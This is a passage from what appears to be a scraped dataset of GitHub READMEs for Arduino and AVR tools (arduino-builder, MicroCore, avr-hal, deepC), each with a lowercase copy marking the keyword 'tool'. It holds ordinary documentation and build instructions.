create a build.options.json file in build path. it's used to understand if build options (such as hardware folders, fqbn and so on) were changed when compiling the same sketch. if they changed, the whole build path is wiped out. if they didn't change, previous compiled files will be reused if the corresponding source files didn't change as well. you can save this file locally and use it instead of specifying -hardware, -tools, -libraries, -fqbn, -pref and -ide-version.\nusing it for continuously verify your libraries or cores\nsee doing continuous integration with arduino builder.\nbuilding from source\nyou need a version of go >=1.13.0.\nthe project now uses go.mod for dependecy management, there is no need to go get anything or to set gopath env vars. the build is very simple:\n$ git clone https://github.com/arduino/arduino-builder.git\n$ cd arduino-builder\n$ go build\n[.....]\n$ ./arduino-builder -version\narduino builder 1.5.1\ncopyright (c) 2015 arduino llc and contributors\nsee https://www.arduino.cc/ and https://github.com/arduino/arduino-builder/graphs/contributors\nthis is free software; see the source for copying conditions. there is no\nwarranty; not even for merchantability or fitness for a particular purpose.\nsecurity\nif you think you found a vulnerability or other security-related bug in this project, please read our security policy and report the bug to our security team \ud83d\udee1\ufe0f thank you!\ne-mail contact: security@arduino.cc\nlicense and copyright\narduino-builder is licensed under general public license version 2, as published by the free software foundation. see license.txt.\ncopyright (c) 2017 arduino ag and contributors\nsee https://www.arduino.cc/ and https://github.com/arduino/arduino-builder/graphs/contributors", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000113, "year": null}, {"Unnamed: 0": 2161, "autor": 121, "date": null, "content": "MicroCore\nMicroCore is a lightweight Arduino hardware package for ATtiny13, ATtiny13A and ATtiny13V. It's easy to install, easy to use, have lots of features and support most Arduino functions. If you're into low level AVR programming, I'm happy to tell you that all relevant keywords are being highlighted by the IDE through a separate keywords file. Make sure to check out the example files (File > Examples > AVR C code examples).\nIf you're looking for a great development board for the ATtiny13, and DIP-8 ATtinys in general, I got you covered! This board has all the bells and whistles you need from a board like this, and still, it measures only 42x42mm!\nRead more and purchase on my Tindie store!\nTable of contents\nMicroCore\nTable of contents\nWhy use the ATtiny13 in an Arduino project?\nSupported clock frequencies\nLTO\nBOD option\nEEPROM option\nAnalog pins\nTiming options\nSerial support\nInternal oscillator calibration\nProgrammers\nCore settings\nHow to install\nBoards Manager Installation\nManual Installation\nPlatformIO\nGetting started with MicroCore\nPinout\nMinimal setup\nWorking Arduino functions and libraries\nArduino functions\nArduino libraries\nOther libraries\nAcknowledgements\nWhy use the ATtiny13 in an Arduino project?\nThey're DIRT cheap (we're talking cents here!)\nThey come in both DIP and SOIC packages\nThey're pin compatible with the ATtiny25/45/85 family and often code compatible\nMost of the Arduino functions is implemented in MicroCore\nThanks to MicroCore you can fit a lot of high level code into 1024 bytes!\nSupported clock frequencies\nThe ATtiny13 has several internal oscillators, and these are the available clock frequencies:\n9.6 MHz internal oscillator (default)\n4.8 MHz internal oscillator\n1.2 MHz internal oscillator\n600 kHz internal oscillator *\n128 kHz internal watchdog oscillator *\nIf you want other or higher clock frequencies, you can apply an external clock source. Note that the ATtiny13 requires an external clock signal, and is not able to drive a resonator circuit itself. You may use a quartz crystal oscillator or a crystal driver (shown in minimal setup). Supported external clock frequencies:\n20 MHz external oscillator\n16 MHz external oscillator\n12 MHz external oscillator\n8 MHz external oscillator\n1 MHz external oscillator\nSelect the ATtiny13 in the boards menu, then select the clock frequency. You'll have to hit \"Burn bootloader\" in order to set the correct fuses. Make sure you connect an ISP programmer, and select the correct one in the \"Programmers\" menu.\n* Make sure to use one of the \"slow\" programmer options when using the 600 or 128 kHz option (e.g USBtinyISP (slow)).\nLTO\nLTO or link time optimization is enabled by default, and reduces the code size at compile time. If you want to learn more about compiler flags and link time optimization (LTO), head over to the GNU GCC website. Ralph Doncaster has also written a great post about LTO you should read.\nCompiler optimization can certainly make your code smaller in size. Still, it's all about writing efficient code. Atmel have created an application note on how to write more efficient C code for AVR microcontrollers. This is great knowledge, so you should absolutely check it out - AVR4027: Tips and Tricks to Optimize Your C Code for 8-bit AVR Microcontrollers.\nBOD option\nBrown out detection, or BOD for short lets the microcontroller sense the input voltage and shut down if the voltage goes below the brown out setting. These are the available BOD options:\n4.3V\n2.7V\n1.8V\nDisabled\nEEPROM option\nIf you want the EEPROM to be erased every time you burn the bootloader or upload using a programmer, you can turn off this option. You'll have to connect an ISP programmer and hit \"Burn bootloader\" to enable or disable EEPROM retain. Note that when uploading using a bootloader, the EEPROM will always be retained.\nAnalog pins\nMicroCore requires you to refer to analog pins like so: analogRead(A3);. The compiler will throw an error if you use the digital pin number instead. If you're storing the analog pin number as a variable, you'll have to use the analog_pin_t typedef or #define\n#define MYPIN A3\nanalog_pin_t myPin = A3;\ndigitalRead(myPin);\nTiming options\nYou can choose to enable or disable micros() directly from the timing menu. Great if you want to save some flash memory! millis() is automatically linked in when used.\nSerial support\nMicroCore features a brilliant, ultra-lightweight software UART library called picoUART, wrapped by Serial. This means you can use regular Serial.print()if you need to. Note that the baud rate has to be defined at compile-time and cannot be defined in the sketch. The table below shows a list of which clock frequencies use which baud rates by default. If you need a different baud rate for a specific clock frequency, you may modify the core_settings.h file.\nIf you want to use the UART functionality you will have to have the right hardware connected to the right pins on the ATtiny13. See the minimal setup section for more information. Also, please have a look at the provided serial example sketches.\nClock Baud rate\n(External) 20 MHz 115200\n(External) 16 MHz 115200\n(External) 12 MHz 115200\n(External) 8 MHz 115200\n(External) 1 MHz 19200\n(Internal) 9.6 MHz 115200\n(Internal) 4.8 MHz 57600\n(Internal) 1.2 MHz 19200\n(Internal) 600 kHz 9600\n(Internal) 128 kHz Not supported\nInternal oscillator calibration\nThe internal 9.6 and 4.8 MHz internal oscillators (yes, these are separate in some silicon revisions) in the ATtiny13 are usually not very accurate. This is acceptable for many applications, but when you're using an asynchronous protocol like UART, \u00b13-4% off simply won't work. To solve this problem MicroCore provides a user-friendly Oscillator calibration sketch that calculate a new OSCCAL value based on a received character over UART. All you need to do is to load the sketch, select the correct baud rate in the serial monitor, select No line ending and send the x character many times (x [send], x [send] ...). After a few tries, you should gradually see readable text in the serial monitor. After the calibration value has stabilized it's automatically stored in EEPROM address 0 for future use. This value is not loaded by default, but has to be loaded \"manually\" in your sketch like so:\n// Check if there exist any OSCCAL value in EEPROM addr. 0\n// If not, run the oscillator tuner sketch first\nuint8_t cal = EEPROM.read(0);\nif (cal < 0x80)\nOSCCAL = cal;\nThe reason why it checks if the calibration value is less than 0x80 is that the OSCCAL value can only be 0x7F or less, and the default value when the EEPROM is erased and empty is 0xFF. The code snippet above is just a primitive way to check if a value that could be loaded into the OSCCAL register is present.\nHuge thanks to Ralph Doncaster for providing his excellent picoUART library and his oscillator calibration code. None of this would be close to possible if it weren't for his brilliant work!\nProgrammers\nWhen the ATtiny13 is running from the internal 600 or 128 kHz oscillator, it may be too slow to interact with the programming tool. That's why this core adds some additional programmers to the list, with the suffix (slow). These options makes the programmers run at a lower clock speed, so the microcontroller can keep up.\nSelect your microcontroller in the boards menu, then select the clock frequency. You'll have to hit \"Burn bootloader\" in order to set the correct fuses and upload the correct bootloader.\nMake sure you connect an ISP programmer, and select the correct one in the \"Programmers\" menu.\nCore settings\nTo make sure you're able to fit your whole project into this tiny microcontroller and still be able to use Arduino functions, I've added some core settings. By modifying the core_settings.h file you can enable or disable core functions you need or don't need. If you know what you're doing and want full control, you can disable the safemode. For instance safemode makes sure that PWM gets turned off if a pin drives high or low, or digital pins don't exceed the number 5 (6 digital pins in total). By disabling safemode you'll gain some speed and flash space.\nHow to install\nBoards Manager Installation\nMicroCore requires Arduino IDE version 1.6.13 or greater.\nOpen the Arduino IDE.\nOpen the File > Preferences menu item.\nEnter the following URL in Additional Boards Manager URLs: https://mcudude.github.io/MicroCore/package_MCUdude_MicroCore_index.json\nOpen the Tools > Board > Boards Manager... menu item.\nWait for the platform indexes to finish downloading.\nScroll down until you see the MicroCore entry and click on it.\nClick Install.\nAfter installation is complete close the Boards Manager window.\nManual Installation\nClick on the \"Clone or download\" button in the upper right corner. Extract the ZIP file, and move the extracted folder to the location \"~/Documents/Arduino/hardware\". Create the \"hardware\" folder if it doesn't exist. Open Arduino IDE, and a new category in the boards menu called \"MicroCore\" will show up.\nPlatformIO\nPlatformIO is an open source ecosystem for IoT and embedded development, and supports MicroCore.\n*See PlatformIO.md for more information.\nGetting started with MicroCore\nOk, so you have downloaded and installed MicroCore, but how do you get the wheels spinning? Here's a quick start guide:\nHook up your microcontroller as shown in the pinout diagram.\nOpen the Tools > Board menu item, and select ATtiny13.\nSelect your prefered BOD option. Read more about BOD here.\nSelect your prefered clock frequency. 9.6 MHz internal oscillator is the default setting. Do not use the external oscillator option if you don't have an external clock source. Remember that a regular two pin crystal will not work on the ATtiny13.\nIf you want you can change the compiler flags for further optimization. Leave this on the default setting if you don't know what compiler flags are.\nSelect what kind of programmer you're using under the Programmers menu. Use one of the slow programmers if you're using the 600 or 128 kHz oscillator option, e.g USBtinyISP (slow).\nHit Burn Bootloader to burn the fuses. The \"settings\" are now stored on the microcontroller!\nNow that the correct fuse settings is sat you can upload your code by using your programmer tool. Simply hit Upload, and the code will be uploaded to the microcontroller.\nIf you want to do some changes; change the BOD option for instance, you'll have to hit Burn Bootloader again.\nPinout\nThis diagram shows the pinout and the peripherals of ATtiny13. The Arduino pinout is directly mapped to the port number to minimize code footprint. Click to enlarge:\nMinimal setup\nClick to enlarge:\nWorking Arduino functions and libraries\nDue to the limited hardware not all default Arduino functions and libraries is supported by the ATtiny13. Here's a list of all working Arduino functions and libraries that's included in the MicroCore package.\nArduino functions\nanalogRead()\nanalogWrite()\nattachInterrupt()\nbit()\nbitClear()\nbitRead()\nbitSet()\nbitWrite()\nconstrain()\ndegrees()\ndelay()\ndelayMicroseconds()\ndetachInterrupt()\ndigitalRead()\ndigitalWrite()\nhighByte()\ninterrupts()\nlowByte()\nmap()\nmax()\nmin()\nmicros() micros() must be enabled from the Tools menu\nmillis() Watchdog timer based. Will increase with steps of 16\nnoInterrupts()\nnoTone()\npinMode()\npow()\npulseIn() micros() must be enabled from the Tools menu\nradians()\nrandom()\nrandomSeed()\nround()\nshiftIn()\nshiftOut()\nsizeof()\nstopTone\nsq()\nsqrt()\ntone()\nArduino libraries\nSPI master library, TinySPI.h (software implementation)\nSPISettings\nbegin()\nend()\nbeginTransmission()\nendTransmission()\nsetBitOrder()\nsetClockDivider()\nsetDataMode()\ntransfer()\nusingInterrupt() Not implemented\nI2C master library, TinyWire.h (software implementation)\nbegin()\nbeginTransmission()\nendTransmission()\nwrite()\nrequestFrom()\nread()\ntransfer()\navailable() Not implemented\nonReceive() Not implemented\nonRequest() Not implemented\nEEPROM library, EEPROM.h\nEEPROM[]\nread()\nwrite()\nupdate()\nget()\nput()\nOther libraries\nFlash library, Flash.h\nerase_page()\nfill_page()\nwrite_page()\nread()\nget_address()\nput()\nget()\nCapacitive touch, ADCTouch.h\nread()\nAcknowledgements\nMicroCore is based Smeezekitty's core13, which is an Arduino ATtiny13 hardware package for IDE 1.0.x.\nThe software serial and software i2c implementation is based on the excellent work done by Ralph Doncaster.", "link": "https://github.com/MCUdude/MicroCore", "origin": "Github", "suborigin": "arduino", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "microcore\nmicrocore is a lightweight arduino hardware package for attiny13, attiny13a and attiny13v. it's easy to install, easy to use, have lots of features and support most arduino functions. if you're into low level avr programming, i'm happy to tell you that all relevant keywords are being highlighted by the ide through a separate keywords file. make sure to check out the example files (file > examples > avr c code examples).\nif you're looking for a great development board for the attiny13, and dip-8 attinys in general, i got you covered! this board has all the bells and whistles you need from a board like this, and still, it measures only 42x42mm!\nread more and purchase on my tindie store!\ntable of contents\nmicrocore\ntable of contents\nwhy use the attiny13 in an arduino project?\nsupported clock frequencies\nlto\nbod option\neeprom option\nanalog pins\ntiming options\nserial support\ninternal oscillator calibration\nprogrammers\ncore settings\nhow to install\nboards manager installation\nmanual installation\nplatformio\ngetting started with microcore\npinout\nminimal setup\nworking arduino functions and libraries\narduino functions\narduino libraries\nother libraries\nacknowledgements\nwhy use the attiny13 in an arduino project?\nthey're dirt cheap (we're talking cents here!)\nthey come in both dip and soic packages\nthey're pin compatible with the attiny25/45/85 family and often code compatible\nmost of the arduino functions is implemented in microcore\nthanks to microcore you can fit a lot of high level code into 1024 bytes!\nsupported clock frequencies\nthe attiny13 has several internal oscillators, and these are the available clock frequencies:\n9.6 mhz internal oscillator (default)\n4.8 mhz internal oscillator\n1.2 mhz internal oscillator\n600 khz internal oscillator *\n128 khz internal watchdog oscillator *\nif you want other or higher clock frequencies, you can apply an external clock source. note that the attiny13 requires an external clock signal, and is not able to drive a resonator circuit itself. you may use a quartz crystal oscillator or a crystal driver (shown in minimal setup). supported external clock frequencies:\n20 mhz external oscillator\n16 mhz external oscillator\n12 mhz external oscillator\n8 mhz external oscillator\n1 mhz external oscillator\nselect the attiny13 in the boards menu, then select the clock frequency. you'll have to hit \"burn bootloader\" in order to set the correct fuses. make sure you connect an isp programmer, and select the correct one in the \"programmers\" menu.\n* make sure to use one of the \"slow\" programmer options when using the 600 or 128 khz option (e.g usbtinyisp (slow)).\nlto\nlto or link time optimization is enabled by default, and reduces the code size at compile time. if you want to learn more about compiler flags and link time optimization (lto), head over to the gnu gcc website. ralph doncaster has also written a great post about lto you should read.\ncompiler optimization can certainly make your code smaller in size. still, it's all about writing efficient code. atmel have created an application note on how to write more efficient c code for avr microcontrollers. this is great knowledge, so you should absolutely check it out - avr4027: tips and tricks to optimize your c code for 8-bit avr microcontrollers.\nbod option\nbrown out detection, or bod for short lets the microcontroller sense the input voltage and shut down if the voltage goes below the brown out setting. these are the available bod options:\n4.3v\n2.7v\n1.8v\ndisabled\neeprom option\nif you want the eeprom to be erased every time you burn the bootloader or upload using a programmer, you can turn off this option. you'll have to connect an isp programmer and hit \"burn bootloader\" to enable or disable eeprom retain. note that when uploading using a bootloader, the eeprom will always be retained.\nanalog pins\nmicrocore requires you to refer to analog pins like so: analogread(a3);. the compiler will throw an error if you use the digital pin number instead. if you're storing the analog pin number as a variable, you'll have to use the analog_pin_t typedef or #define\n#define mypin a3\nanalog_pin_t mypin = a3;\ndigitalread(mypin);\ntiming options\nyou can choose to enable or disable micros() directly from the timing menu. great if you want to save some flash memory! millis() is automatically linked in when used.\nserial support\nmicrocore features a brilliant, ultra-lightweight software uart library called picouart, wrapped by serial. this means you can use regular serial.print()if you need to. note that the baud rate has to be defined at compile-time and cannot be defined in the sketch. the table below shows a list of which clock frequencies use which baud rates by default. if you need a different baud rate for a specific clock frequency, you may modify the core_settings.h file.\nif you want to use the uart functionality you will have to have the right hardware connected to the right pins on the attiny13. see the minimal setup section for more information. also, please have a look at the provided serial example sketches.\nclock baud rate\n(external) 20 mhz 115200\n(external) 16 mhz 115200\n(external) 12 mhz 115200\n(external) 8 mhz 115200\n(external) 1 mhz 19200\n(internal) 9.6 mhz 115200\n(internal) 4.8 mhz 57600\n(internal) 1.2 mhz 19200\n(internal) 600 khz 9600\n(internal) 128 khz not supported\ninternal oscillator calibration\nthe internal 9.6 and 4.8 mhz internal oscillators (yes, these are separate in some silicon revisions) in the attiny13 are usually not very accurate. this is acceptable for many applications, but when you're using an asynchronous protocol like uart, \u00b13-4% off simply won't work. to solve this problem microcore provides a user-friendly oscillator calibration sketch that calculate a new osccal value based on a received character over uart. all you need to do is to load the sketch, select the correct baud rate in the serial monitor, select no line ending and send the x character many times (x [send], x [send] ...). after a few tries, you should gradually see readable text in the serial monitor. after the calibration value has stabilized it's automatically stored in eeprom address 0 for future use. this value is not loaded by default, but has to be loaded \"manually\" in your sketch like so:\n// check if there exist any osccal value in eeprom addr. 0\n// if not, run the oscillator tuner sketch first\nuint8_t cal = eeprom.read(0);\nif (cal < 0x80)\nosccal = cal;\nthe reason why it checks if the calibration value is less than 0x80 is that the osccal value can only be 0x7f or less, and the default value when the eeprom is erased and empty is 0xff. the code snippet above is just a primitive way to check if a value that could be loaded into the osccal register is present.\nhuge thanks to ralph doncaster for providing his excellent picouart library and his oscillator calibration code. none of this would be close to possible if it weren't for his brilliant work!\nprogrammers\nwhen the attiny13 is running from the internal 600 or 128 khz oscillator, it may be too slow to interact with the programming -----> tool !!! . that's why this core adds some additional programmers to the list, with the suffix (slow). these options makes the programmers run at a lower clock speed, so the microcontroller can keep up.\nselect your microcontroller in the boards menu, then select the clock frequency. you'll have to hit \"burn bootloader\" in order to set the correct fuses and upload the correct bootloader.\nmake sure you connect an isp programmer, and select the correct one in the \"programmers\" menu.\ncore settings\nto make sure you're able to fit your whole project into this tiny microcontroller and still be able to use arduino functions, i've added some core settings. by modifying the core_settings.h file you can enable or disable core functions you need or don't need. if you know what you're doing and want full control, you can disable the safemode. for instance safemode makes sure that pwm gets turned off if a pin drives high or low, or digital pins don't exceed the number 5 (6 digital pins in total). by disabling safemode you'll gain some speed and flash space.\nhow to install\nboards manager installation\nmicrocore requires arduino ide version 1.6.13 or greater.\nopen the arduino ide.\nopen the file > preferences menu item.\nenter the following url in additional boards manager urls: https://mcudude.github.io/microcore/package_mcudude_microcore_index.json\nopen the tools > board > boards manager... menu item.\nwait for the platform indexes to finish downloading.\nscroll down until you see the microcore entry and click on it.\nclick install.\nafter installation is complete close the boards manager window.\nmanual installation\nclick on the \"clone or download\" button in the upper right corner. extract the zip file, and move the extracted folder to the location \"~/documents/arduino/hardware\". create the \"hardware\" folder if it doesn't exist. open arduino ide, and a new category in the boards menu called \"microcore\" will show up.\nplatformio\nplatformio is an open source ecosystem for iot and embedded development, and supports microcore.\n*see platformio.md for more information.\ngetting started with microcore\nok, so you have downloaded and installed microcore, but how do you get the wheels spinning? here's a quick start guide:\nhook up your microcontroller as shown in the pinout diagram.\nopen the tools > board menu item, and select attiny13.\nselect your prefered bod option. read more about bod here.\nselect your prefered clock frequency. 9.6 mhz internal oscillator is the default setting. do not use the external oscillator option if you don't have an external clock source. remember that a regular two pin crystal will not work on the attiny13.\nif you want you can change the compiler flags for further optimization. leave this on the default setting if you don't know what compiler flags are.\nselect what kind of programmer you're using under the programmers menu. use one of the slow programmers if you're using the 600 or 128 khz oscillator option, e.g usbtinyisp (slow).\nhit burn bootloader to burn the fuses. the \"settings\" are now stored on the microcontroller!\nnow that the correct fuse settings is sat you can upload your code by using your programmer tool. simply hit upload, and the code will be uploaded to the microcontroller.\nif you want to do some changes; change the bod option for instance, you'll have to hit burn bootloader again.\npinout\nthis diagram shows the pinout and the peripherals of attiny13. the arduino pinout is directly mapped to the port number to minimize code footprint. click to enlarge:\nminimal setup\nclick to enlarge:\nworking arduino functions and libraries\ndue to the limited hardware not all default arduino functions and libraries is supported by the attiny13. here's a list of all working arduino functions and libraries that's included in the microcore package.\narduino functions\nanalogread()\nanalogwrite()\nattachinterrupt()\nbit()\nbitclear()\nbitread()\nbitset()\nbitwrite()\nconstrain()\ndegrees()\ndelay()\ndelaymicroseconds()\ndetachinterrupt()\ndigitalread()\ndigitalwrite()\nhighbyte()\ninterrupts()\nlowbyte()\nmap()\nmax()\nmin()\nmicros() micros() must be enabled from the tools menu\nmillis() watchdog timer based. will increase with steps of 16\nnointerrupts()\nnotone()\npinmode()\npow()\npulsein() micros() must be enabled from the tools menu\nradians()\nrandom()\nrandomseed()\nround()\nshiftin()\nshiftout()\nsizeof()\nstoptone\nsq()\nsqrt()\ntone()\narduino libraries\nspi master library, tinyspi.h (software implementation)\nspisettings\nbegin()\nend()\nbegintransmission()\nendtransmission()\nsetbitorder()\nsetclockdivider()\nsetdatamode()\ntransfer()\nusinginterrupt() not implemented\ni2c master library, tinywire.h (software implementation)\nbegin()\nbegintransmission()\nendtransmission()\nwrite()\nrequestfrom()\nread()\ntransfer()\navailable() not implemented\nonreceive() not implemented\nonrequest() not implemented\neeprom library, eeprom.h\neeprom[]\nread()\nwrite()\nupdate()\nget()\nput()\nother libraries\nflash library, flash.h\nerase_page()\nfill_page()\nwrite_page()\nread()\nget_address()\nput()\nget()\ncapacitive touch, adctouch.h\nread()\nacknowledgements\nmicrocore is based smeezekitty's core13, which is an arduino attiny13 hardware package for ide 1.0.x.\nthe software serial and software i2c implementation is based on the excellent work done by ralph doncaster.", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000121, "year": null}, {"Unnamed: 0": 2166, "autor": 126, "date": null, "content": "avr-hal\nHardware Abstraction Layer for AVR microcontrollers and common boards (for example Arduino). Based on the avr-device crate.\nThis is a new version of avr-hal! Older versions can be found in the old branch but will no longer get support.\nQuickstart\nYou need a nightly Rust compiler for compiling Rust code for AVR. Note: Due to a regression, versions after nightly-2021-01-07 are currently broken (see #124). Please use that version of the compiler for now. The correct version will be installed automatically.\nNext, install \"ravedude\", a tool which seamlessly integrates flashing your board into the usual cargo workflow:\ncargo +stable install ravedude\nGo into ./examples/arduino-uno (or the directory for whatever board you want), and run the following commands:\ncd examples/arduino-uno\n# Build and run it on a connected board\ncargo run --bin uno-blink\nStarting your own project\nThe best way to start your own project is via the avr-hal-template which you can easily use with cargo-generate:\ncargo generate --git https://github.com/Rahix/avr-hal-template.git\nRepository Structure\nThe avr-hal repository is a workspace containing all components making up the HAL. Here is an overview:\narduino-hal\narduino-hal is the batteries-included HAL for all Arduino & similar boards. This is what you probably want to use for your projects. It is intentionally built to abstract away the differences between boards as much as possible.\nexamples/*\nThe examples directory contains lots of examples for common hardware. Do note that not all examples were ported to all boards, but there is a good chance that you can still use the code. Currently, the Arduino Uno crate contains the most examples.\nmcu/atmega-hal , mcu/attiny-hal\nHAL crates for AVR microcontroller families. If you have a custom board, you'll want to work with these crates. Please check their documentation for a list of supported MCUs.\navr-hal-generic\nThis is a generic crate containing most of the HAL implementaions in the form of macros which are instanciated in each HAL crate for the specific MCUs. If you intend to write drivers that work with any AVR chip, targeting avr-hal-generic is probably the best route.\navr-specs/\nThe avr-specs/ directory contains rustc target definitions for all supported microcontrollers. You will need these for compiling rust code for AVR. The avr-hal-template already includes them for convenience.\nravedude\nravedude is a utility for seamlessly integrating avrdude and a serial console into the cargo workflow. With a bit of configuration (check its README!) you can then upload your code to your board and view its output over the serial console by just using cargo run as you would normally.\nDisclaimer\nThis project is not affiliated with either Microchip (former Atmel) nor any of the Vendors that created the boards supported in this repository.\nLicense\navr-hal is licensed under either of\nApache License, Version 2.0 (LICENSE-APACHE or http://www.apache.org/licenses/LICENSE-2.0)\nMIT license (LICENSE-MIT or http://opensource.org/licenses/MIT)\nat your option.\nContribution\nUnless you explicitly state otherwise, any contribution intentionally submitted for inclusion in the work by you, as defined in the Apache-2.0 license, shall be dual licensed as above, without any additional terms or conditions.", "link": "https://github.com/Rahix/avr-hal", "origin": "Github", "suborigin": "arduino", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "avr-hal\nhardware abstraction layer for avr microcontrollers and common boards (for example arduino). based on the avr-device crate.\nthis is a new version of avr-hal! older versions can be found in the old branch but will no longer get support.\nquickstart\nyou need a nightly rust compiler for compiling rust code for avr. note: due to a regression, versions after nightly-2021-01-07 are currently broken (see #124). please use that version of the compiler for now. the correct version will be installed automatically.\nnext, install \"ravedude\", a -----> tool !!!  which seamlessly integrates flashing your board into the usual cargo workflow:\ncargo +stable install ravedude\ngo into ./examples/arduino-uno (or the directory for whatever board you want), and run the following commands:\ncd examples/arduino-uno\n# build and run it on a connected board\ncargo run --bin uno-blink\nstarting your own project\nthe best way to start your own project is via the avr-hal-template which you can easily use with cargo-generate:\ncargo generate --git https://github.com/rahix/avr-hal-template.git\nrepository structure\nthe avr-hal repository is a workspace containing all components making up the hal. here is an overview:\narduino-hal\narduino-hal is the batteries-included hal for all arduino & similar boards. this is what you probably want to use for your projects. it is intentionally built to abstract away the differences between boards as much as possible.\nexamples/*\nthe examples directory contains lots of examples for common hardware. do note that not all examples were ported to all boards, but there is a good chance that you can still use the code. currently, the arduino uno crate contains the most examples.\nmcu/atmega-hal , mcu/attiny-hal\nhal crates for avr microcontroller families. if you have a custom board, you'll want to work with these crates. please check their documentation for a list of supported mcus.\navr-hal-generic\nthis is a generic crate containing most of the hal implementaions in the form of macros which are instanciated in each hal crate for the specific mcus. if you intend to write drivers that work with any avr chip, targeting avr-hal-generic is probably the best route.\navr-specs/\nthe avr-specs/ directory contains rustc target definitions for all supported microcontrollers. you will need these for compiling rust code for avr. the avr-hal-template already includes them for convenience.\nravedude\nravedude is a utility for seamlessly integrating avrdude and a serial console into the cargo workflow. with a bit of configuration (check its readme!) you can then upload your code to your board and view its output over the serial console by just using cargo run as you would normally.\ndisclaimer\nthis project is not affiliated with either microchip (former atmel) nor any of the vendors that created the boards supported in this repository.\nlicense\navr-hal is licensed under either of\napache license, version 2.0 (license-apache or http://www.apache.org/licenses/license-2.0)\nmit license (license-mit or http://opensource.org/licenses/mit)\nat your option.\ncontribution\nunless you explicitly state otherwise, any contribution intentionally submitted for inclusion in the work by you, as defined in the apache-2.0 license, shall be dual licensed as above, without any additional terms or conditions.", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000126, "year": null}, {"Unnamed: 0": 2182, "autor": 142, "date": null, "content": "deepC\nThe deepC is a vendor independent deep learning library, compiler and inference framework designed for small form-factor devices including \u03bcControllers, IoT and Edge devices\n\ud83d\udc49click here to see it in action\ud83d\udc48\n\ud83c\udfc3\u200d\u2642\ufe0f Using deepC\nHere are few of many ways.\nTry deepC with Colab Noteboook\nInstall it on Ubuntu, raspbian (or any other debian derivatives) using pip install deepC\nCompile onnx model- read this article or watch this video\nUse deepC with a Docker File\nSee more examples in tutorial dir.\n\ud83d\udcdb what is deepC?\ndeepC library, compiler and inference framework is designed to enable and perform deep learning neural networks by focussing on features of small form-factor devices like micro-controllers, eFPGAs, cpus and other embedded devices like raspberry-pi, odroid, arduino, SparkFun Edge, risc-V, mobile phones, x86 and arm laptops among others.\ndeepC also offers ahead of time compiler producing optimized executable based on LLVM compiler tool chain specialized for deep neural networks with ONNX as front end.\n\ud83d\udcdd Design\nMain components of deepC have been designed to represent and optimize the common deep learning networks in high level graph IR and to transform the computation graph to minimize memory utilization, optimize data layout and fuse computation patterns for different hardware backends.\nRead more at high level design document\n\ud83d\udca7 PreRequisites\nONNX 1.5\nLLVM 8.0\nPython 3.6\nSWIG 3.0\n\ud83d\udcbb Development\nBuild and start modifying deepC locally from source code with following steps\n\u2b55 Ubuntu 18.04\nFollow the steps to install pre-requisites\nsudo apt-get update\nsudo apt-get install build-essential python3.6-dev python3-pip swig doxygen clang-format clang clang-8 llvm-8 llvm-8-dev protobuf-compiler libprotoc-dev\nsudo pip3 install numpy==1.15.0 onnx==1.5.0\nOnce you are done, build deepC\ngit clone https://github.com/ai-techsystems/deepC.git\ncd deepC\nmake\n\u2b55 Mac OS / Windows 10\nMake sure you have the below pre-requisites\nMac OS:\nPython for Mac\nDocker for Mac\nWindows 10:\nPython for Windows\nDocker for Windows\nOnce you are done, build deepC inside docker container\ngit clone https://github.com/ai-techsystems/deepC.git\ncd deepC\npython buildDocker.py\n\ud83d\udcdc Output\nfind include src swig -name \\*.h -print0 -o -name \\*.cpp -print0 | xargs -0 -P8 -n1 clang-format -i\nmake -C src\nmake[1]: Entering directory 'deepC/src'\nmake -C core\nmake[2]: Entering directory 'deepC/src/core'\ncompiling broadcast.cpp\n/usr/bin/g++ -O3 -Wall -std=c++14 -fPIC -march=native -msse2 \\\n-isystem ./packages/eigen-eigen-323c052e1731 -I./include \\\n-c broadcast.cpp -o obj/broadcast.o\ncompiling tensor.cpp\n...\n...\n/usr/bin/g++ -shared ./obj/dnnc_swig.o ./obj/dnnc_pyutils.o ./obj/dnnc_api.o -o lib/libdnnc.so\nln -s -f lib/libdnnc.so _dnnc.so\n/usr/bin/python3 ../test/swig/basic.py\nCurrent Support\nSupported Architectures Status\nArm \u2714\ufe0f\nArmv7 \u2714\ufe0f\nArm64 \u2714\ufe0f\nAMD64 \u2714\ufe0f\nppc64le \u2714\ufe0f\nSupported OS Distributions Status\nLinux Ubuntu 18.04 \u2714\ufe0f\nLinux CentOS 6 \u2714\ufe0f\nLinux Arch Linux \u2714\ufe0f\nLinux Manjaro \u2714\ufe0f\nWindows 1803 and above \u2714\ufe0f\nMac OS Sierra and above \u2714\ufe0f\n\u2795 Contribute\ndnn Compiler adopts apache committer model, we aim to create an open source project that is maintained and owned by the community. Checkout the Contributor Guide.\n\ud83d\ude4f Acknowledgement\nWe acknowledge the efforts predecessor projects like LLVM, ONNX etc. to make this project a reality.\n\ud83d\udd75\ufe0f\u200d\u2642\ufe0f Why compiler\u2754\ndeepC is targeted towards devices with small formfactor like microcontrollers, which are part of all sorts of household devices: think appliances, cars, and toys. In fact, there are around 30 billion microcontroller-powered devices produced each year. They're cheap, require very little energy, and are very reliable.\nBy bringing deep learning models to tiny microcontrollers, we can boost the intelligence of billions of devices that we use in our lives, without relying on expensive hardware or reliable internet connections. Imagine smart appliances that can adapt to your daily routine, intelligent industrial sensors that understand the difference between problems and normal operation, and magical toys that can help kids learn in fun and delightful ways.\nContributors\nCode Contributors\nThis project exists because of the people who [Contribute]. Thanks! \ud83d\ude4f\nFinancial Contributors\nBecome a financial contributor and help us sustain our community. [Contribute]\nIndividuals\nOrganizations\nSupport this project with your organization. Your logo will show up here with a link to your website. [Contribute]", "link": "https://github.com/ai-techsystems/deepC", "origin": "Github", "suborigin": "arduino", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "deepc\nthe deepc is a vendor independent deep learning library, compiler and inference framework designed for small form-factor devices including \u03bccontrollers, iot and edge devices\n\ud83d\udc49click here to see it in action\ud83d\udc48\n\ud83c\udfc3\u200d\u2642\ufe0f using deepc\nhere are few of many ways.\ntry deepc with colab noteboook\ninstall it on ubuntu, raspbian (or any other debian derivatives) using pip install deepc\ncompile onnx 